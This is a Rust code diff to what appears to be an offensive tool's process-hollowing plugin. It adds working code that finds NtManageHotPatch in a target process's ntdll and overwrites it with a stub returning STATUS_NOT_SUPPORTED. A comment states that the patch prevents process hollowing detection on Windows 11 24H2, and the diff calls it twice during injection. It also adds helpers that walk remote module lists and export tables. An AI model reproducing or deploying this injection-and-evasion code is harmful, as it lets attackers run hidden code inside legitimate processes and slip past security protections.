@@ -94,6 +94,12 @@ impl PluginApp {
             println!("[hollow/exe] NtUnmapViewOfSection status: 0x{:X}", status.0);
         }
 
+        // 3.1. Apply Windows 11 24H2 compatibility patches (first patch point)
+        println!("[hollow/exe] Applying Windows 11 24H2 compatibility patches...");
+        if let Err(e) = Self::patch_nt_manage_hot_patch_simple(h_process) {
+            println!("[hollow/exe][warn] Failed to apply Windows 11 24H2 patches (continuing anyway): {}", e);
+        }
+
         // 4. Parse new EXE headers using proper PE parsing
         let (image_base, entry_rva, size_of_image) = Self::parse_pe_headers(pe_data)?;
         println!("[hollow/exe] Parsed EXE: size_of_image=0x{:X}, entry_rva=0x{:X}, image_base=0x{:X}", size_of_image, entry_rva, image_base);
@@ -172,6 +178,12 @@ impl PluginApp {
         if let Err(e) = Self::set_section_protections(pe_data, h_process, new_base as *mut c_void) {
             println!("[hollow/exe][error] set_section_protections failed: {e}");
             return Err(anyhow::anyhow!("set_section_protections failed: {e}"));
+        }
+
+        // 7.4. Apply Windows 11 24H2 compatibility patches (second patch point)
+        println!("[hollow/exe] Re-applying Windows 11 24H2 compatibility patches...");
+        if let Err(e) = Self::patch_nt_manage_hot_patch_simple(h_process) {
+            println!("[hollow/exe][warn] Failed to re-apply Windows 11 24H2 patches (continuing anyway): {}", e);
         }
 
         // 8. Set thread context to new entry point
@@ -1578,4 +1590,254 @@ pub fn enable_debug_privilege() -> anyhow::Result<(), anyhow::Error> {
         AdjustTokenPrivileges(h_token, false, Some(&tp), 0, None, None).context("AdjustTokenPrivileges failed")?;
     }
     Ok(())
+}
+
+    /// Windows 11 24H2 Compatibility Patches
+    /// Patches NtManageHotPatch syscall to prevent process hollowing detection
+    /// Based on research from https://hshrzd.wordpress.com/2025/01/27/process-hollowing-on-windows-11-24h2/
+    /// and implementation from https://github.com/hasherezade/libpeconv/blob/master/run_pe/patch_ntdll.cpp
+    pub unsafe fn patch_nt_manage_hot_patch_simple(process_handle: HANDLE) -> anyhow::Result<(), anyhow::Error> {
+        // Get handle to ntdll.dll in the target process
+        let ntdll_module = Self::get_remote_module_base(process_handle, "ntdll.dll")?;
+        if ntdll_module == 0 {
+            return Err(anyhow::anyhow!("Failed to find ntdll.dll in target process"));
+        }
+        
+        // Get the address of NtManageHotPatch in the target process
+        let nt_manage_hot_patch_addr = Self::get_remote_proc_address(process_handle, ntdll_module, "NtManageHotPatch")?;
+        if nt_manage_hot_patch_addr == 0 {
+            return Err(anyhow::anyhow!("Failed to find NtManageHotPatch in target process"));
+        }
+        
+        println!("[patch] Found NtManageHotPatch at 0x{:X}", nt_manage_hot_patch_addr);
+        
+        // Read original bytes for validation
+        let mut original_bytes = [0u8; 8];
+        if ReadProcessMemory(
+            process_handle,
+            nt_manage_hot_patch_addr as *const c_void,
+            original_bytes.as_mut_ptr() as *mut c_void,
+            8,
+            None
+        ).is_err() {
+            return Err(anyhow::anyhow!("Failed to read original NtManageHotPatch bytes"));
+        }
+        
+        // Create patch that returns STATUS_NOT_SUPPORTED (0xC00000BB)
+        // mov eax, 0xC00000BB ; STATUS_NOT_SUPPORTED
+        // ret
+        let patch_bytes = [
+            0xB8, 0xBB, 0x00, 0x00, 0xC0,  // mov eax, 0xC00000BB
+            0xC3,                           // ret  
+            0x90, 0x90                      // nop nop (padding)
+        ];
+        
+        // Change memory protection to allow writing
+        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+        if VirtualProtectEx(
+            process_handle,
+            nt_manage_hot_patch_addr as *const c_void,
+            patch_bytes.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut old_protect
+        ).is_err() {
+            return Err(anyhow::anyhow!("Failed to change memory protection for NtManageHotPatch"));
+        }
+        
+        // Write the patch
+        if WriteProcessMemory(
+            process_handle,
+            nt_manage_hot_patch_addr as *const c_void,
+            patch_bytes.as_ptr() as *const c_void,
+            patch_bytes.len(),
+            None
+        ).is_err() {
+            // Restore original protection on failure
+            VirtualProtectEx(
+                process_handle,
+                nt_manage_hot_patch_addr as *const c_void,
+                patch_bytes.len(),
+                old_protect,
+                &mut old_protect
+            ).ok();
+            return Err(anyhow::anyhow!("Failed to write NtManageHotPatch patch"));
+        }
+        
+        // Restore original protection
+        if VirtualProtectEx(
+            process_handle,
+            nt_manage_hot_patch_addr as *const c_void,
+            patch_bytes.len(),
+            old_protect,
+            &mut old_protect
+        ).is_err() {
+            println!("[patch][warn] Failed to restore original memory protection");
+        }
+        
+        // Flush instruction cache to ensure patch takes effect
+        if FlushInstructionCache(process_handle, Some(nt_manage_hot_patch_addr as *const c_void), patch_bytes.len()).is_err() {
+            println!("[patch][warn] Failed to flush instruction cache");
+        }
+        
+        println!("[patch] Successfully patched NtManageHotPatch to return STATUS_NOT_SUPPORTED");
+        Ok(())
+    }
+    
+    /// Get the base address of a module in a remote process
+    unsafe fn get_remote_module_base(process_handle: HANDLE, module_name: &str) -> anyhow::Result<usize, anyhow::Error> {
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(process_handle))?;
+        
+        let mut module_entry = MODULEENTRY32W::default();
+        module_entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;
+        
+        if Module32FirstW(snapshot, &mut module_entry).is_ok() {
+            loop {
+                let current_name = String::from_utf16_lossy(&module_entry.szModule)
+                    .trim_end_matches('\0')
+                    .to_lowercase();
+                
+                if current_name == module_name.to_lowercase() {
+                    CloseHandle(snapshot).ok();
+                    return Ok(module_entry.modBaseAddr as usize);
+                }
+                
+                if Module32NextW(snapshot, &mut module_entry).is_err() {
+                    break;
+                }
+            }
+        }
+        
+        CloseHandle(snapshot).ok();
+        Err(anyhow::anyhow!("Module {} not found in target process", module_name))
+    }
+    
+    /// Get the address of a function in a remote process module
+    unsafe fn get_remote_proc_address(process_handle: HANDLE, module_base: usize, function_name: &str) -> anyhow::Result<usize, anyhow::Error> {
+        // Read DOS header manually
+        let mut dos_header = [0u8; 64];
+        ReadProcessMemory(
+            process_handle,
+            module_base as *const c_void,
+            dos_header.as_mut_ptr() as *mut c_void,
+            dos_header.len(),
+            None
+        )?;
+        
+        // Check DOS signature ("MZ")
+        if &dos_header[0..2] != b"MZ" {
+            return Err(anyhow::anyhow!("Invalid DOS signature"));
+        }
+        
+        // Get e_lfanew (offset to NT headers)
+        let e_lfanew = u32::from_le_bytes(dos_header[0x3C..0x40].try_into().unwrap()) as usize;
+        
+        // Read NT headers
+        let nt_headers_addr = module_base + e_lfanew;
+        let mut nt_headers = [0u8; 0x108]; // Size to cover NT headers + optional header
+        ReadProcessMemory(
+            process_handle,
+            nt_headers_addr as *const c_void,
+            nt_headers.as_mut_ptr() as *mut c_void,
+            nt_headers.len(),
+            None
+        )?;
+        
+        // Check NT signature ("PE\0\0")
+        if &nt_headers[0..4] != b"PE\0\0" {
+            return Err(anyhow::anyhow!("Invalid NT signature"));
+        }
+        
+        // Get export directory RVA from data directories
+        // NT headers structure: Signature(4) + FileHeader(20) + OptionalHeader(varies)
+        // For x64: OptionalHeader starts at offset 24, DataDirectory at offset 112 (0x70)
+        // Export directory is the first entry in DataDirectory
+        let optional_header_offset = 24;
+        let data_directory_offset = optional_header_offset + 0x70;
+        let export_dir_rva = u32::from_le_bytes(
+            nt_headers[data_directory_offset..data_directory_offset + 4].try_into().unwrap()
+        );
+        
+        if export_dir_rva == 0 {
+            return Err(anyhow::anyhow!("No export directory"));
+        }
+        
+        // Read export directory
+        let export_dir_addr = module_base + export_dir_rva as usize;
+        let mut export_dir_bytes = [0u8; 40]; // Size of IMAGE_EXPORT_DIRECTORY
+        ReadProcessMemory(
+            process_handle,
+            export_dir_addr as *const c_void,
+            export_dir_bytes.as_mut_ptr() as *mut c_void,
+            export_dir_bytes.len(),
+            None
+        )?;
+        
+        // Parse export directory fields manually
+        let number_of_names = u32::from_le_bytes(export_dir_bytes[24..28].try_into().unwrap());
+        let address_of_functions_rva = u32::from_le_bytes(export_dir_bytes[28..32].try_into().unwrap());
+        let address_of_names_rva = u32::from_le_bytes(export_dir_bytes[32..36].try_into().unwrap());
+        let address_of_name_ordinals_rva = u32::from_le_bytes(export_dir_bytes[36..40].try_into().unwrap());
+        
+        // Read name table
+        let names_addr = module_base + address_of_names_rva as usize;
+        let mut name_rvas = vec![0u32; number_of_names as usize];
+        ReadProcessMemory(
+            process_handle,
+            names_addr as *const c_void,
+            name_rvas.as_mut_ptr() as *mut c_void,
+            name_rvas.len() * 4,
+            None
+        )?;
+        
+        // Read ordinal table
+        let ordinals_addr = module_base + address_of_name_ordinals_rva as usize;
+        let mut ordinals = vec![0u16; number_of_names as usize];
+        ReadProcessMemory(
+            process_handle,
+            ordinals_addr as *const c_void,
+            ordinals.as_mut_ptr() as *mut c_void,
+            ordinals.len() * 2,
+            None
+        )?;
+        
+        // Search for function name
+        for (i, &name_rva) in name_rvas.iter().enumerate() {
+            let name_addr = module_base + name_rva as usize;
+            let mut name_bytes = [0u8; 256];
+            ReadProcessMemory(
+                process_handle,
+                name_addr as *const c_void,
+                name_bytes.as_mut_ptr() as *mut c_void,
+                256,
+                None
+            ).ok();
+            
+            let name = std::ffi::CStr::from_bytes_until_nul(&name_bytes)
+                .map_err(|_| anyhow::anyhow!("Invalid function name"))?
+                .to_str()
+                .map_err(|_| anyhow::anyhow!("Invalid UTF-8 in function name"))?;
+            
+            if name == function_name {
+                let ordinal = ordinals[i];
+                
+                // Read function address
+                let functions_addr = module_base + address_of_functions_rva as usize;
+                let function_rva_addr = functions_addr + (ordinal as usize * 4);
+                
+                let mut function_rva_bytes = [0u8; 4];
+                ReadProcessMemory(
+                    process_handle,
+                    function_rva_addr as *const c_void,
+                    function_rva_bytes.as_mut_ptr() as *mut c_void,
+                    4,
+                    None
+                )?;
+                
+                let function_rva = u32::from_le_bytes(function_rva_bytes);
+                return Ok(module_base + function_rva as usize);
+            }
+        }
+        
+        Err(anyhow::anyhow!("Function {} not found", function_name))
+    }
 }
